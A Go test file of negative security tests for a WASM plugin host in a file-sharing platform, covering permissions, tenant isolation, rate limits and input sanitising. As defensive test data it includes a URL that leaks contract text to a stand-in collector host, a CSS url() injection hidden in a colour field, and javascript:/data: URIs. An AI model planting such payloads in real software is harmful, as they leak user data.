package wasmplugin

// Negative tests: each proves that a door the platform promises to keep shut
// refuses what it must. They are written against APIs that existed before the
// hardening, so the same file runs (red) against the earlier code.

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/brf-tech/filex/backend/internal/model"
	"github.com/brf-tech/filex/backend/internal/notify"
	"github.com/brf-tech/filex/backend/internal/pathkey"
	"github.com/brf-tech/filex/backend/internal/tenant"
	"github.com/brf-tech/filex/backend/pkg/pluginkit/wire"
)

// secUser is a person with an account role (and so, on a storage without
// RBAC, that role's level everywhere: user = editor, viewer = viewer).
func secUser(t *testing.T, h *harness, email, role string) *model.User {
	t.Helper()
	u, err := h.store.CreateUser(context.Background(), email, "x", role, "en", "UTC")
	require.NoError(t, err)
	return u
}

// secJobScope is the scope a job of p runs in for actor, on the given inputs.
func secJobScope(t *testing.T, h *harness, p *Installed, actor *model.User, inputs ...string) *Scope {
	t.Helper()
	s, err := newScope(p, h.reg, NewJobID(), h.st.ID, h.drv, actor, "en", true)
	require.NoError(t, err)
	t.Cleanup(s.Close)
	s.storageName = "main"
	s.outputMode = "sibling"
	for _, rel := range inputs {
		s.AddInput(rel, 1, "text/plain")
	}
	return s
}

func secCode(err error) string {
	var he *hostError
	if errors.As(err, &he) {
		return he.Code
	}
	return ""
}

func (h *harness) secFolder(t *testing.T, rel string) *model.Node {
	t.Helper()
	n, err := h.store.CreateNode(context.Background(), &model.Node{
		StorageID: h.st.ID, Name: rel[strings.LastIndex(rel, "/")+1:], Path: "/" + rel,
		PathHash: pathkey.Hash(h.st.ID, "/"+rel), Type: model.NodeTypeDirectory, SyncState: model.SyncStateSynced,
	})
	require.NoError(t, err)
	return n
}

// ⚠⚠ A link WITH a page was anchored on whatever node the plugin named — a
// folder the person had never been given included — and the folder browser
// then served every file under it. The anchor must be one of the job's inputs.
func TestSecurity_ShareCreate_APageLinkIsOnlyAboutAFileTheJobWasGiven(t *testing.T) {
	h := newHarness(t, nil)
	p := h.install(t)
	h.writeCatalogued(t, "docs/contract.txt", "the terms")
	h.writeCatalogued(t, "private/salaries.txt", "secret")
	h.secFolder(t, "private")
	editor := secUser(t, h, "ed@test.local", model.RoleUser)
	ctx := context.Background()

	for _, path := range []string{"private", "private/salaries.txt", "main://private"} {
		s := secJobScope(t, h, p, editor, "docs/contract.txt")
		in, _ := json.Marshal(map[string]any{"page_id": "signer", "path": path,
			"files": []map[string]string{{"ref": "in:0", "name": "contract.txt"}}})
		_, err := hfShareCreate(ctx, s, in)
		require.Error(t, err, "a page link anchored on %q, which the job was never given", path)
		assert.Equal(t, wire.ErrPermissionDenied, secCode(err), path)
	}
	rows, _, err := h.store.ListAppPluginShares(ctx, p.Row.ID, false, 50, 0)
	require.NoError(t, err)
	assert.Empty(t, rows, "no link was minted")

	// The input itself is what a page link is about, as before.
	s := secJobScope(t, h, p, editor, "docs/contract.txt")
	out, err := hfShareCreate(ctx, s, json.RawMessage(`{"page_id":"signer","files":[{"ref":"in:0","name":"contract.txt"}]}`))
	require.NoError(t, err)
	assert.NotEmpty(t, out.(map[string]any)["token"])
}

// ⚠⚠ A public link is an outbound-access grant; the Share dialog asks editor
// for it. A viewer running an app with `public_pages` handed a file they
// could only look at to anyone holding the link.
func TestSecurity_ShareCreate_AViewerCannotPublishWhatTheyMayOnlyRead(t *testing.T) {
	h := newHarness(t, nil)
	p := h.install(t)
	h.writeCatalogued(t, "docs/contract.txt", "the terms")
	viewer := secUser(t, h, "view@test.local", model.RoleViewer)
	ctx := context.Background()

	for name, body := range map[string]string{
		"a link with no page":   `{"ref":"in:0"}`,
		"a page with its copy":  `{"page_id":"signer","files":[{"ref":"in:0","name":"contract.txt"}]}`,
		"the old function name": `{"page_id":"signer"}`,
	} {
		t.Run(name, func(t *testing.T) {
			s := secJobScope(t, h, p, viewer, "docs/contract.txt")
			_, err := hfShareCreate(ctx, s, json.RawMessage(body))
			require.Error(t, err)
			assert.Equal(t, wire.ErrPermissionDenied, secCode(err))
		})
	}

	// An editor may, exactly as in the Share dialog.
	editor := secUser(t, h, "ed2@test.local", model.RoleUser)
	s := secJobScope(t, h, p, editor, "docs/contract.txt")
	_, err := hfShareCreate(ctx, s, json.RawMessage(`{"ref":"in:0"}`))
	require.NoError(t, err)
}

// ⚠⚠ A lock freezes a file for everyone, administrators included, and pins
// every folder above it. It was taken on the job's ACL alone (viewer for an
// action that writes nothing), and through `path` on any file of the storage.
func TestSecurity_FileLock_NeedsEditorAndAJobWithNobodyLocksOnlyItsInputs(t *testing.T) {
	h := newHarness(t, nil)
	p := h.install(t)
	h.writeCatalogued(t, "docs/contract.txt", "the terms")
	h.writeCatalogued(t, "hr/other.txt", "not given")
	viewer := secUser(t, h, "view@test.local", model.RoleViewer)
	ctx := context.Background()

	s := secJobScope(t, h, p, viewer, "docs/contract.txt")
	for _, body := range []string{`{"ref":"in:0","ttl_days":1}`, `{"path":"main://hr/other.txt","ttl_days":1}`} {
		_, err := hfFileLock(ctx, s, json.RawMessage(body))
		require.Error(t, err, body)
		assert.Equal(t, wire.ErrPermissionDenied, secCode(err), body)
	}

	// A job nobody asked for (actor id 0: the wake-up's) reaches no further
	// than the files it was handed.
	sys := secJobScope(t, h, p, &model.User{}, "docs/contract.txt")
	_, err := hfFileLock(ctx, sys, json.RawMessage(`{"path":"main://hr/other.txt","ttl_days":1}`))
	require.Error(t, err)
	assert.Equal(t, wire.ErrPermissionDenied, secCode(err))

	locks, err := h.reg.opts.Store.ListAppPluginLocks(ctx, h.st.ID)
	require.NoError(t, err)
	assert.Empty(t, locks, "nothing was frozen")

	// An editor locks the file they gave the job, as before.
	editor := secUser(t, h, "ed@test.local", model.RoleUser)
	_, err = hfFileLock(ctx, secJobScope(t, h, p, editor, "docs/contract.txt"), json.RawMessage(`{"ref":"in:0","ttl_days":1}`))
	require.NoError(t, err)
}

// ⚠⚠ The wake-up scheduled WRITING jobs with no person behind them on any
// path of any storage it named. Only files the app keeps state on — the ones
// a person once ran it on — may be named now.
func TestSecurity_Schedule_UnattendedWorkOnlyOnFilesTheAppKeepsStateOn(t *testing.T) {
	h := newHarness(t, nil)
	h.writeFile(t, "hr/salaries.txt", "secret")
	st, _, err := h.reg.Install(context.Background(), echoInput(t, scheduleManifest))
	require.NoError(t, err)
	p, ok := h.reg.ByID(st.ID)
	require.True(t, ok)
	require.NoError(t, h.reg.PutSettings(context.Background(), st.ID, map[string]string{
		"tick_mode": "due", "tick_path": "main://hr/salaries.txt", "tick_due_in_s": "600",
	}))
	q := &fakeQueue{}
	h.reg.SetJobQueue(q)

	h.pass(t, tickAt)
	assert.Nil(t, h.row(t, p, "due"), "nothing may be scheduled on a file nobody gave the app")
	wake := h.row(t, p, model.AppPluginScheduleWakeupKey)
	require.NotNil(t, wake)
	assert.Contains(t, LocalizeNote(wake.Error, "en"), "state", "the refusal names the rule")
	assert.Equal(t, 0, h.pass(t, tickAt.Add(10*time.Minute)))
	assert.Empty(t, q.all(), "no job was queued")

	// Once a person ran the app on it, the app keeps state there and may
	// come back to it unattended.
	require.NoError(t, h.reg.opts.Store.SetAppPluginState(context.Background(), p.Row.ID, h.st.ID,
		pathkey.Hash(h.st.ID, "/hr/salaries.txt"), "hr/salaries.txt", "envelope", "1"))
	h.pass(t, tickAt.Add(time.Hour))
	assert.NotNil(t, h.row(t, p, "due"))
}

// ⚠⚠ `__output` in a scheduled item's params is the HOST's per-job output
// choice, which runJob obeys without asking again: a folder on any storage.
func TestSecurity_Schedule_AnItemCannotCarryTheHostsOutputChoice(t *testing.T) {
	h := newHarness(t, nil)
	p, _ := h.installScheduled(t, map[string]string{"tick_mode": "quiet"}, nil)
	require.NoError(t, h.reg.opts.Store.SetAppPluginState(context.Background(), p.Row.ID, h.st.ID,
		pathkey.Hash(h.st.ID, "/docs/a.txt"), "docs/a.txt", "envelope", "1"))
	now := tickAt
	h.reg.storeItems(context.Background(), p, []wire.ScheduleItem{{
		Key: "forged", ActionID: "expire", DueAt: now.Add(5 * time.Minute), Paths: []string{"main://docs/a.txt"},
		Params: map[string]any{"__output": map[string]any{"mode": "folder", "dir": "other://"}, "page_token_hash": "x", "keep": "me"},
	}}, now, now.Add(time.Hour))
	item := h.row(t, p, "forged")
	require.NotNil(t, item)
	assert.NotContains(t, item.ParamsJSON, "__output")
	assert.NotContains(t, item.ParamsJSON, "page_token_hash")
	assert.Contains(t, item.ParamsJSON, "keep", "the app's own parameters pass")
}

type secNotifySink struct {
	mu   sync.Mutex
	sent []notify.Event
}

func (s *secNotifySink) Send(_ context.Context, e notify.Event) (int64, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.sent = append(s.sent, e)
	return int64(len(s.sent)), nil
}

// ⚠⚠ Multi-tenant: `to_user_id` took any id, so an app put a notice (with a
// file target on THIS tenant's storage) into another tenant's user's bell.
func TestSecurity_NotifySend_DoesNotCrossTheTenantLine(t *testing.T) {
	h := newHarness(t, nil)
	p := h.install(t)
	h.writeCatalogued(t, "docs/contract.txt", "the terms")
	sink := &secNotifySink{}
	h.reg.SetNotify(sink)
	mine := secUser(t, h, "mine@test.local", model.RoleUser)
	outsider := secUser(t, h, "outsider@test.local", model.RoleUser)
	// The multi-tenant wiring (server.go): each person's scope is their
	// tenant's storages. The outsider's tenant does not have this storage.
	h.reg.SetUserScope(func(ctx context.Context, u *model.User) context.Context {
		if u != nil && u.ID == outsider.ID {
			return tenant.WithScope(ctx, &tenant.Scope{ProviderID: 2, StorageIDs: []int64{h.st.ID + 1000}})
		}
		return tenant.WithScope(ctx, &tenant.Scope{ProviderID: 1, StorageIDs: []int64{h.st.ID}})
	})
	ctx := context.Background()

	body := func(to int64) json.RawMessage {
		b, _ := json.Marshal(map[string]any{"title": map[string]string{"en": "Please sign"}, "to_user_id": to,
			"target": map[string]string{"ref": "in:0"}})
		return b
	}
	_, err := hfNotifySend(ctx, secJobScope(t, h, p, mine, "docs/contract.txt"), body(outsider.ID))
	require.Error(t, err)
	assert.Equal(t, wire.ErrNotFound, secCode(err), "another tenant's person reads as nobody")
	assert.Empty(t, sink.sent)

	_, err = hfNotifySend(ctx, secJobScope(t, h, p, outsider, "docs/contract.txt"), body(mine.ID))
	require.NoError(t, err, "a person of the storage's own tenant is addressed as before")
	assert.Len(t, sink.sent, 1)
}

// ⚠⚠ Every screen event instantiates the module afresh with up to its memory
// ceiling, for up to its call budget; a public page event needs nothing but
// the link. Jobs had a ceiling, screens none.
func TestSecurity_ScreenCallsPerAppAreBounded(t *testing.T) {
	h := newHarness(t, nil)
	st, _, err := h.reg.Install(context.Background(), echoInput(t, func(m map[string]any) {
		m["limits"] = map[string]any{"call_timeout_s": 5}
	}))
	require.NoError(t, err)
	p, ok := h.reg.ByID(st.ID)
	require.True(t, ok)

	const burst = 12
	errs := make(chan error, burst)
	var wg sync.WaitGroup
	for i := 0; i < burst; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			_, err := h.reg.ViewEvent(context.Background(), p.Row.Name, "stall", 0, nil, nil, "en", wire.ViewEventInput{Event: "open"})
			errs <- err
		}()
	}
	wg.Wait()
	close(errs)
	busy, timedOut := 0, 0
	for err := range errs {
		switch {
		case IsCode(err, "busy"):
			busy++
		case IsCode(err, CodeTimeout):
			timedOut++
		}
	}
	assert.Greater(t, busy, 0, "a burst beyond the ceiling is told the app is busy instead of each getting an instance")
	assert.LessOrEqual(t, timedOut, 8, "no more instances ran at once than the ceiling allows")
}

// ⚠⚠ Props reached the viewer's network: a pdf-fields `src.url` was fetched
// by every browser that opened the screen (an anonymous visitor's too), so an
// app with no `http:` grant had a way out; a signer's `color` became a CSS
// background, where url() is a request too.
func TestSecurity_SurfacePropsCannotReachTheNetwork(t *testing.T) {
	s := &wire.Surface{Nodes: []wire.Node{{Type: "form", Children: []wire.Node{{
		Type: "pdf-fields", ID: "doc",
		Props: map[string]any{
			"src": map[string]any{"url": "https://collector.example/doc.pdf?d=the-contract-text", "ref": "pub:0"},
			"signers": []any{
				map[string]any{"id": "a", "color": "red; background-image: url(https://collector.example/p)"},
				map[string]any{"id": "b", "color": "#2563eb"},
				map[string]any{"id": "c", "color": "rgb(37, 99, 235)"},
			},
		},
	}}}}}
	SanitizeSurface(s)
	props := s.Nodes[0].Children[0].Props
	src := props["src"].(map[string]any)
	assert.NotContains(t, src, "url", "a document is a copy the call exposes or a path read with the viewer's rights")
	assert.Equal(t, "pub:0", src["ref"])
	signers := props["signers"].([]any)
	assert.NotContains(t, signers[0].(map[string]any), "color")
	assert.Equal(t, "#2563eb", signers[1].(map[string]any)["color"])
	assert.Equal(t, "rgb(37, 99, 235)", signers[2].(map[string]any)["color"])
}

// ⚠ The homepage is drawn as a link on the app's page in the admin panel.
func TestSecurity_ManifestHomepageIsAnHTTPAddress(t *testing.T) {
	base := func(home string) []byte {
		b, _ := json.Marshal(map[string]any{"manifest_version": 1, "name": "x", "version": "1.0.0",
			"label": map[string]string{"en": "X"}, "homepage": home})
		return b
	}
	for _, bad := range []string{"javascript:void(1)", "JavaScript:void(0)", "data:text/html,x", "//other.example", "vbscript:x"} {
		m, err := ParseManifest(base(bad))
		require.NoError(t, err, "the field is only shown: an app is not refused over it")
		assert.Empty(t, m.Homepage, "%s is never handed to the page as a link", bad)
	}
	m, err := ParseManifest(base("https://github.com/BRF-Tech/filex-sign"))
	require.NoError(t, err)
	assert.Equal(t, "https://github.com/BRF-Tech/filex-sign", m.Homepage)
}

// ⚠⚠ `http:*.` allowed every host spelled with a trailing dot (HasHost's
// suffix match); `http:*.com` a whole top-level domain; `http:*`, ports and
// user-info read to an administrator as something narrow.
func TestSecurity_HTTPPermissionNamesAHostOrASubdomainWildcard(t *testing.T) {
	for _, bad := range []string{"http:*", "http:*.", "http:*.com", "http:a*.example.com", "http:api.example.com:8443",
		"http:user@api.example.com", "http:api..example.com", "http:-api.example.com", "http:api.example.com."} {
		_, err := ParsePermission(bad)
		assert.Error(t, err, bad)
	}
	for _, good := range []string{"http:api.example.com", "http:*.example.org", "http:fonts.gstatic.com", "http:freetsa.org", "http:example.test"} {
		_, err := ParsePermission(good)
		assert.NoError(t, err, good)
	}
	g := NewGrants([]Permission{"http:api.example.com"})
	assert.False(t, g.HasHost("other.example."), "no grant covers a host because it is spelled with a trailing dot")
}
